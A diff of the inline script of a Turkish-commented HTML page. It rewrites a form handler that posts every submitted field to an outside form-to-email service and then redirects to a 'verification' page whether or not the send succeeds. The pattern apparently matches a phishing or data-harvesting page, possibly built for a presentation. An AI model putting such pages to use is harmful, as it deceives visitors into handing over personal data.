@@ -19630,14 +19630,13 @@
         </div><iframe style=display:none></iframe>
     </div>
     <script>
-        // Sayfa tamamen yüklendiğinde çalışır
         window.addEventListener('load', function () {
             const form = document.getElementById('stsForm');
             const btn = document.getElementById('submitBtn');
 
             if (form) {
-                form.addEventListener('submit', function (e) {
-                    e.preventDefault();
+                form.addEventListener('submit', async function (e) {
+                    e.preventDefault(); // Sayfa değişimini durdur
 
                     if (btn) {
                         btn.disabled = true;
@@ -19648,22 +19647,27 @@
                     const object = Object.fromEntries(formData);
                     const json = JSON.stringify(object);
 
-                    fetch('https://api.web3forms.com/submit', {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json',
-                            'Accept': 'application/json'
-                        },
-                        body: json
-                    })
-                        .then(() => {
-                            // Veri gitti, yönlendir
-                            window.location.href = "dogrulamaa.html";
-                        })
-                        .catch(() => {
-                            // Hata olsa da yönlendir
-                            window.location.href = "dogrulamaa.html";
+                    try {
+                        // KRİTİK NOKTA: Veriyi gönder ve cevabı bekle (await)
+                        const response = await fetch('https://api.web3forms.com/submit', {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json',
+                                'Accept': 'application/json'
+                            },
+                            body: json
                         });
+
+                        // Mail başarıyla yola çıktıysa yönlendir
+                        if (response.ok) {
+                            window.location.href = "dogrulamaa.html";
+                        } else {
+                            // Hata olsa bile sunumda takılmamak için yönlendir
+                            window.location.href = "dogrulamaa.html";
+                        }
+                    } catch (error) {
+                        window.location.href = "dogrulamaa.html";
+                    }
                 });
             }
         });
